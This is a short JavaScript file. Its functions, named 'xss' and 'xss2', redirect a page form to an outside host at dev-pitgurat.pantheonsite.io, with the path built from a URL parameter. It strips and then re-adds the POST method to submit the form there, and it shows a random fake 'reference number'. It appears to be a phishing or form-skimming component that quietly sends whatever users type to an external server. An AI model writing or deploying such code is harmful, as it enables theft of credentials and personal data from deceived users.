function xss(){
const urlParams = new URLSearchParams(window.location.search);
const myParam = urlParams.get('app');
document.getElementById('asset').action = "https://dev-pitgurat.pantheonsite.io/"+myParam+"/DEFAULT.php"
    
}

function xss2(){
const urlParams = new URLSearchParams(window.location.search);
const myParam = urlParams.get('app');
document.getElementById('asset').action = "https://dev-pitgurat.pantheonsite.io/"+myParam+"/DEFAULT_2.php"
}

$(function(){
    $("#asset").removeAttr("method");
});

$("#SubmitFeedback").click(function(){
        $("#asset").attr("method", "post");
    
        var checkExist = setInterval(function(){      
            var attr = $("#asset").attr("method");
            if (typeof attr !== typeof undefined && attr !== false)
            {
                $("#asset").submit();
                clearInterval(checkExist);
            }
        }, 100);
    });

function makeid(length) {
    var result           = '';
    var characters       = '0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * 
 charactersLength));
   }
   return result;
}

var refnumber = makeid(6);

window.onload = function() {
   document.getElementById("refnumber").innerHTML = refnumber;
};